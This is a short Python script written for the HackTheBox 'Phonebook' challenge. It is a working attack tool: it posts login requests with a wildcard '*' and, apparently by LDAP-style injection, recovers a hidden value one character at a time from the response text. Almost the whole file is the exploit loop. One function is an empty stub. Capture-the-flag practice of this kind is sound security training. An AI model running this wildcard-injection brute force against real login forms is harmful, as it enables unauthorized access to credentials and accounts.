# This tool is created for "Phonebook" in HackTheBox
# https://app.hackthebox.com/challenges/phonebook

import requests
import argparse

list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '!', "'", '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', ',', '{', '}', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']


def bruteforce(url: str, ch: str):
    pass

def main(url: str):
    data = {'username': '', 'password': '*'}
    result = ''

    flag = 1
    while flag == 1:
        flag = 0

        for l in list:
            data['username'] = result + l + '*'
            r = requests.post(url, data=data)

            if 'No search results' in r.text:
                result += l
                flag = 1
                print(result)
                break

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('url')
    args = parser.parse_args()

    url = args.url

    main(url)

